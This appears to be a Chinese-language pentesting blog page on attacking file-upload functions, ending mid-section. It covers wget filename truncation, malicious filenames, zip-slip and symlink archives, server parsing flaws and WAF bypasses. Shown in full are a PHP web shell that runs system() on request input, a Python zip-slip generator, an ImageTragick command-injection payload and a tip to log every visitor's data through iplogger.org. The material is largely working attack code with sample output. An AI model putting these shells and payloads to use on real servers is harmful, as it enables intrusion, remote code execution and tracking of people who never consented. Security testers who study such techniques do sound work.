<h2 id="wget-File-Upload-x2F-SSRF-Trick"><a href="#wget-File-Upload-x2F-SSRF-Trick" class="headerlink" title="wget File Upload&#x2F;SSRF Trick"></a>wget File Upload&#x2F;SSRF Trick</h2><p>在某些情况下，您可能会发现服务器正在使用 wget 下载文件，您可以指定 URL。在这些情况下，代码可能会检查下载文件的扩展名是否在白名单内，以确保只下载允许的文件。但是，可以绕过此检查。 Linux 中文件名的最大长度为 255，但是，wget 将文件名截断为 236 个字符。您可以下载一个名为 <code>&quot;A&quot;*232+&quot;.php&quot;+&quot;.gif</code> 的文件，这个文件名将绕过检查（因为在这个例子中“.gif”是一个有效的扩展名）但是 wget 会将文件重命名为“一个”*232+”.php”。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Create file and HTTP server</span></span><br><span class="line">echo &quot;SOMETHING&quot; &gt; $(python -c &#x27;print(&quot;A&quot;*(236-4)+&quot;.php&quot;+&quot;.gif&quot;)&#x27;)</span><br><span class="line">python3 -m http.server 9080</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Download the file</span></span><br><span class="line">wget 127.0.0.1:9080/$(python -c &#x27;print(&quot;A&quot;*(236-4)+&quot;.php&quot;+&quot;.gif&quot;)&#x27;)</span><br><span class="line">The name is too long, 240 chars total.</span><br><span class="line">Trying to shorten...</span><br><span class="line">New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.</span><br><span class="line">--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif</span><br><span class="line">Connecting to 127.0.0.1:9080... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 10 [image/gif]</span><br><span class="line">Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’</span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================&gt;]      10  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]</span><br></pre></td></tr></table></figure>

<p>或者可以尝试通过 302 重定到另一个文件来绕过后缀名检查，然后 <code>wget</code> 将下载具有新名称的文件。例如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://example.com/file.zip</span></span><br><span class="line">--2022-04-04 10:00:00--  https://example.com/file.zip</span><br><span class="line">Resolving example.com (example.com)... 192.0.2.1</span><br><span class="line">Connecting to example.com (example.com)|192.0.2.1|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 302 Found</span><br><span class="line">Location: https://example.com/new-location/shell.jspx [following]</span><br><span class="line">--2022-04-04 10:00:01--  https://example.com/new-location/shell.jspx</span><br><span class="line">Resolving example.com (example.com)... 192.0.2.1</span><br><span class="line">Connecting to example.com (example.com)|192.0.2.1|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 12345 (12K) [application/jspx]</span><br><span class="line">Saving to: &#x27;shell.jspx&#x27;</span><br><span class="line"></span><br><span class="line">shell.jspx               100%[===================&gt;]  12.05K  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2022-04-04 10:00:01 (223 MB/s) - &#x27;shell.jspx&#x27; saved [12345/12345]</span><br></pre></td></tr></table></figure>

<p>请注意，假若 <code>wget</code> 与 <code>--trust-server-names</code> 参数一起使用时，上述技巧将不再有效，因为 <code>wget</code> 将会自动跟随重定向，并将重定向后的文件保存为原始文件的名称, 例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget --trust-server-names https://example.com/file.zip</span><br><span class="line">......</span><br><span class="line">HTTP request sent, awaiting response... 302 Found</span><br><span class="line">Location: https://example.com/new-location/shell.jspx</span><br><span class="line">......</span><br><span class="line">2022-04-04 10:00:01 (223 MB/s) - &#x27;file.zip&#x27; saved [12345/12345]</span><br></pre></td></tr></table></figure>

<h2 id="从上传文件到其他漏洞"><a href="#从上传文件到其他漏洞" class="headerlink" title="从上传文件到其他漏洞"></a>从上传文件到其他漏洞</h2><ul>
<li>filename 设置为 <code>../../../tmp/lol.png</code> ，尝试目录径遍历攻击。</li>
<li>filename 设置为 <code>sleep(10)--.jpg</code>，尝试 SQL 注入攻击</li>
<li>filename 设置为 <code>&lt;svg onload=alert(document.domain)&gt;</code> 尝试 XSS 攻击</li>
<li>filename 设置为 <code>;sleep 10;</code> 尝试命令注入（更多详见：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/command-injection">命令注入技巧</a>） </li>
<li>上传 svg 文件，进行 XSS 攻击，详见 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg#svg-file-upload">svg-xss 技巧</a></li>
<li>上传 svg 文件，进行 XXE 攻击，详见 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#svg-file-upload#svg-file-upload">svg-xxe 技巧</a></li>
<li>上传 svg 文件，进行重定向攻击，详见 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/open-redirect#open-redirect-uploading-svg-files">svg-Open Redirect 技巧</a></li>
<li>更多 svg 相关攻击技巧，详见：<a target="_blank" rel="noopener" href="https://github.com/allanlw/svg-cheatsheet">svg-cheatsheet</a></li>
<li>上传 JS 文件，进行 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-abusing-service-workers">XSS 攻击</a></li>
<li>ImageTrick 漏洞 </li>
<li>如果能够指示 Web 服务器从 URL 获取图像，可以尝试 SSRF 攻击。如果图片保存在公共页面上，则可以通过以下 URL 地址 <code>https://iplogger.org/invisible/</code> 窃取每个访问者的信息。 <a target="_blank" rel="noopener" href="https://www.potatomedia.co/post/4fee0735-90ea-46bc-8739-4626c7cc008e">iplogger.org 使用指南</a>。</li>
<li>通过上传 PDF-Adobe，进行 XXE 和 CORS 攻击, 详见 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass">PDF-Adobe-XXE&amp;CORS 技巧</a></li>
<li>从定制 PDF 到 XSS：如果您可以上传 PDF，您可以准备一些 PDF，这些 PDF 将按照给定的指示执行任意 JS。详见<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection">如何注入 PDF 数据以获取 JS 执行</a>。</li>
<li>上传 <a target="_blank" rel="noopener" href="https://secure.eicar.org/eicar.com.txt">eicar</a> 内容查看服务器是否有杀毒软件</li>
<li>检查上传文件是否有大小限制，DOS？Crash？</li>
</ul>
<p>上传功能 TOP 10 攻击思路   (From <a target="_blank" rel="noopener" href="https://twitter.com/SalahHasoneh1/status/1281274120395685889">Link</a>):</p>
<p><strong>ASP &#x2F; ASPX &#x2F; PHP5 &#x2F; PHP &#x2F; PHP3</strong>: Webshell &#x2F; RCE<br><strong>SVG</strong>: Stored XSS &#x2F; SSRF &#x2F; XXE<br><strong>GIF</strong>: Stored XSS &#x2F; SSRF<br><strong>CSV</strong>: CSV injection<br><strong>XML</strong>: XXE<br><strong>AVI</strong>: LFI(FFmpeg LFI) &#x2F; SSRF<br><strong>HTML &#x2F; JS</strong> : HTML injection &#x2F; XSS &#x2F; Open redirect<br><strong>PNG &#x2F; JPEG</strong>: Pixel flood attack (DoS)<br><strong>ZIP</strong>: RCE via LFI &#x2F; DoS<br><strong>PDF &#x2F; PPTX</strong>: SSRF &#x2F; BLIND XXE</p>
<h2 id="Zip-x2F-Tar-File-Automatically-decompressed-Upload"><a href="#Zip-x2F-Tar-File-Automatically-decompressed-Upload" class="headerlink" title="Zip&#x2F;Tar File Automatically decompressed Upload"></a>Zip&#x2F;Tar File Automatically decompressed Upload</h2><p>当能够上传 Zip&#x2F;Tar 等压缩文件，且服务器会自动解压这些文件的时候。可以尝试以下两个攻击方式：</p>
<ul>
<li><strong>Symlink</strong><br>创建 Symlink 文件并将其链接到一个指定文件，将 Symlink 文件压缩并上传到服务器。访问由服务器解压出来的 Symlink 文件，将可以访问该指定文件。代码示例：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../index.php symindex.txt</span><br><span class="line">zip --symlinks test.zip symindex.txt</span><br><span class="line">tar -cvf test.tar symindex.txt</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>解压到指定文件夹</strong><br>由于 ZIP 存档格式支持分层压缩，所以可以引用更高级别的目录。可以通过目标应用程序提供的解压功能结合  <a target="_blank" rel="noopener" href="https://github.com/ptoomey3/evilarc">evilarc 脚本</a> 来逃逸到其目录。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 evilarc.py -h</span><br><span class="line">python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php</span><br></pre></td></tr></table></figure>

<p>还可以将上述提到的符号链接技巧与 evillarc 一起使用，如果 <code>Flag</code> 位于 <code>/flag.txt</code> 中，可为 <code>/flag.txt</code> 创建一个符号链接，并上传压缩包。</p>
<ul>
<li>通过 python 代码创建恶意压缩包：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_zip</span>():</span><br><span class="line">    f = StringIO()</span><br><span class="line">    z = zipfile.ZipFile(f, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">    z.writestr(<span class="string">&#x27;../../../../../var/www/html/webserver/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#x27;</span>)</span><br><span class="line">    z.writestr(<span class="string">&#x27;otherfile.xml&#x27;</span>, <span class="string">&#x27;Content of the file&#x27;</span>)</span><br><span class="line">    z.close()</span><br><span class="line">    <span class="built_in">zip</span> = <span class="built_in">open</span>(<span class="string">&#x27;poc.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    <span class="built_in">zip</span>.write(f.getvalue())</span><br><span class="line">    <span class="built_in">zip</span>.close() </span><br><span class="line"></span><br><span class="line">create_zip()</span><br></pre></td></tr></table></figure>

<p>攻击步骤 </p>
<ol>
<li>创建 PHP shell:</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用“文件喷射”并创建一个压缩的 zip 文件:</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE&quot;xxA&quot;; cp simple-backdoor.php $FILE&quot;cmd.php&quot;;done</span><br><span class="line">root@s2crew:/tmp# ls *.php</span><br><span class="line">simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php</span><br><span class="line">xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php</span><br><span class="line">xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php</span><br><span class="line">root@s2crew:/tmp# zip cmd.zip xx*.php</span><br><span class="line">  adding: xxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)</span><br><span class="line">root@s2crew:/tmp#</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用十六进制编辑器或 vi 并将 <code>xxA</code> 更改为 <code>../</code>，vi 命令：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set modifiable</span><br><span class="line">:%s/xxA/..\//g</span><br><span class="line">:x!</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Reference: <a target="_blank" rel="noopener" href="https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/">https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/</a></p>
</blockquote>
<h2 id="ImageTragic"><a href="#ImageTragic" class="headerlink" title="ImageTragic"></a>ImageTragic</h2><p>Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)<br>恶意文件生成代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span> = &lt;&lt;&lt;EOF </span><br><span class="line">    push graphic-context</span><br><span class="line">    viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></span><br><span class="line">    fill <span class="string">&#x27;url(https://127.0.0.1/test.jpg&quot;|ls &quot;-la)&#x27;</span></span><br><span class="line">    pop graphic-context</span><br><span class="line">    EOF;</span><br><span class="line">    <span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line">    <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">readImageBlob</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/png&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$image</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="文件上传之中间件解析漏洞及配置错误利用"><a href="#文件上传之中间件解析漏洞及配置错误利用" class="headerlink" title="文件上传之中间件解析漏洞及配置错误利用"></a>文件上传之中间件解析漏洞及配置错误利用</h2><h3 id="Apahce"><a href="#Apahce" class="headerlink" title="Apahce"></a>Apahce</h3><p><strong>Apache HTTPD 换行解析漏洞(CVE-2017-15715)</strong></p>
<ul>
<li>影响版本： 2.4.0~2.4.29</li>
<li>说明：在解析PHP时，1.php\x0A将被按照PHP后缀进行解析。上传并访问&#x2F;1.php%0a，发现能够成功解析，但是这个文件的后缀不是php后缀，说明目标存在解析漏洞。</li>
</ul>
<p><strong>Apache HTTPD 多后缀解析</strong></p>
<ul>
<li>影响版本： 全部</li>
<li>说明：Apache HTTPD  支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：<code>AddType text/html .htmlAddLanguage zh-CN .cn</code><br>其给 <code>.html</code> 增加了一个 <code>media-type</code> ，值为 <code>text/html;</code> 给 <code>.cn</code> 后缀增加了语言，值为 <code>zh-CN</code> 。此时，如果用户请求文件 <code>index.cn.html</code> ，它将会返回一个中午的 <code>html</code> 页面。以上就是 Apache 多后缀的特性。如果运维人员给 <code>.php</code> 后缀增加了处理器： <code>AddHandler application/x-httpd-php .php</code></li>
</ul>
<p>那么，在有多个后缀的情况下，只要有一个文件含有 <code>.php</code> 后缀即将被识别为 PHP 文件，即使最后后缀不是 <code>.php</code> 。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。访问上传目录 <code>/uploads/phpinfo.php.7z</code> ，即可发现， <code>phpinfo</code> 被执行了，该文件被解析为 PHP 脚本。</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p><strong>php-fpm.conf 文件配置不当导致文件解析漏洞</strong></p>
<ul>
<li>影响版本： 全部</li>
<li>说明：php.ini 配置文件中 <code>cgi.fix_pathinfo=1</code>（默认值：”1”），php-fpm.conf 文件中配置存在如下其一，则存在文件解析漏洞</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">security.limit_extensions = </span><br><span class="line">或</span><br><span class="line">security.limit_extensions = .php .jpg</span><br></pre></td></tr></table></figure>

<p>上传 <code>.png</code> 文件，通过 <code>/uploadfiles/nginx.png/.php</code> 方式访问即可 getshell。</p>
<p>在 <code>PHP 5.3.9</code> 之前的版本中， <code>security.limit_extensions</code> 的默认值是空字符串，即不限制 PHP 脚本的扩展名。在 <code>PHP 5.3.9</code> 及之后的版本中， <code>security.limit_extensions</code> 的默认值是 <code>.php .phar</code> ，只允许执行扩展名为 <code>.php</code> 和 <code>.phar</code> 的文件。</p>
<p>注：修改了后需要 <code>service php-fpm restart</code> 重启 PHP。</p>
<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>IIS 7.5 CGI 配置错误问题</strong></p>
<ul>
<li>影响版本： 7.5</li>
<li>说明：<ul>
<li>Fast-CGI 运行模式</li>
<li>php.ini 配置文件： <code>cgi.fix_pathinfo=1</code></li>
<li>取消勾选 <code>php-cgi.exe</code> 程序的 <code>invoke handler only if request is mapped to</code> 。也就是取消勾选模块映射中的请求限制。</li>
<li>在上传的文件名后面加上 <code>/.php</code>，即可被作为 PHP 文件解析。</li>
</ul>
</li>
</ul>
<p><strong>IIS 6.0 解析漏洞</strong></p>
<ul>
<li>影响版本： 6.0</li>
<li>说明：<ul>
<li>在 <code>.asp</code> 、<code>.asa</code> 目录下的任意文件都会以 <code>asp</code> 格式解析文件解析。</li>
<li>WebDAV 功能开启后，<code>evil.asp;.jpg</code> 将会被解析成为 .asp 脚本，原因是 IIS 6.0 的 WebDAV 实现中存在一个缺陷，即如果请求的 URL 包含分号，那么 IIS 6.0 会将分号后面的内容当做参数进行解析，而不是将其作为路径的一部分。攻击者可以通过构造带有分号的 URL 来绕过文件扩展名的限制，。</li>
<li>IIS 6.0 默认的可执行文件除了 <code>asp</code> 还包含 <code>asa 、cer 、cdx</code> ，会将这三种扩展名文件解析为 asp 文件。</li>
</ul>
</li>
</ul>
<h2 id="文件上传之-WAF-对抗"><a href="#文件上传之-WAF-对抗" class="headerlink" title="文件上传之 WAF 对抗"></a>文件上传之 WAF 对抗</h2><p>对于文件上传攻击，大多数 WAF 都是基于文件名解析，某些 WAF 还可能解析文件内容。如果 WAF 基于文件名识别并匹配规则，大概要经历以下步骤：</p>
<ol>
<li>获取 Request Header 的 <code>Content-Type</code> 头中获取 <code>boundary</code> 值。</li>
<li>根据第一步的 <code>boundary</code> 值，解析 <code>POST</code> 数据，获取 <code>filename</code> 值。</li>
<li>匹配安全规则，检测文件名是否符合安全规范。</li>
</ol>
<p>有了上述的认识，我们只需要修改文件上传请求包的内容，让请求包既能被中间件正常解析，同时又能绕过 WAF 的解析或者匹配规则就可以 Bypass WAF 了。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 关键参数</span><br><span class="line">Content-Disposition：内容描述，可污染</span><br><span class="line">name：表单参数值，不可污染</span><br><span class="line">filename：文件名，可污染</span><br><span class="line">Content-Type：文件 MIME，可污染</span><br><span class="line">boundary：内容划分，可污染</span><br></pre></td></tr></table></figure>

<h3 id="引号变换"><a href="#引号变换" class="headerlink" title="引号变换"></a><strong>引号变换</strong></h3><p>头部字段的值既可以添加单引号也可以添加双引号还可以不加引号，都不会影响上传结果。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=file_x; filename=xx.php</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&#x27;form-data&#x27;; name=&quot;file_x&quot;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure>

<p>可以去除掉 <code>filename</code> 字符串中末尾的引号，也能够正常上传</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span> - <span class="title class_">Disposition</span>: form - data;</span><br><span class="line">name = <span class="string">&quot;file_x&quot;</span>;</span><br><span class="line">filename = <span class="string">&quot;xx.php</span></span><br><span class="line"><span class="string">Content - Disposition: form - data;</span></span><br><span class="line"><span class="string">name = &quot;</span>file_x<span class="string">&quot;;</span></span><br><span class="line"><span class="string">filename = &#x27;xx.php</span></span><br><span class="line"><span class="string">Content - Disposition: form - data;</span></span><br><span class="line"><span class="string">name = &quot;</span>file_x<span class="string">&quot;;</span></span><br><span class="line"><span class="string">filename = &quot;</span>xx.<span class="property">php</span>;</span><br></pre></td></tr></table></figure>

<h3 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a><strong>大小写变换</strong></h3><p>对这三个固定的字符串进行大小写转换</p>
<ul>
<li>Content-Disposition</li>
<li>name</li>
<li>filename</li>
</ul>
<p>比如 <code>name</code> 转换成 <code>Name</code> ， <code>Content-Disposition</code> 转换成 <code>content-disposition</code> 。</p>
<h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a><strong>换行符</strong></h3><p>字段值与等号之间可以加入换行符，依然可以正常上传，下面我使用 <code>[0x09]</code> 代替换行符</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php&quot;[0x09]</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]xx.php</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>&quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]xx.php[0x09];</span><br></pre></td></tr></table></figure>

<p>通常文件名后面的换行符为 <code>\r\n</code> ，删除 <code>\r</code> 留下 <code>\n</code> ，有时候可以绕过 WAF 检测。以下为某次授权测试的绕过记录：</p>
<ul>
<li><strong>上传请求</strong></li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-disposition</span><span class="punctuation">: </span>Form-data; name=file; filename=..............jspx+\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png+.jspx\r\n</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>上传响应</strong></li>
</ul>
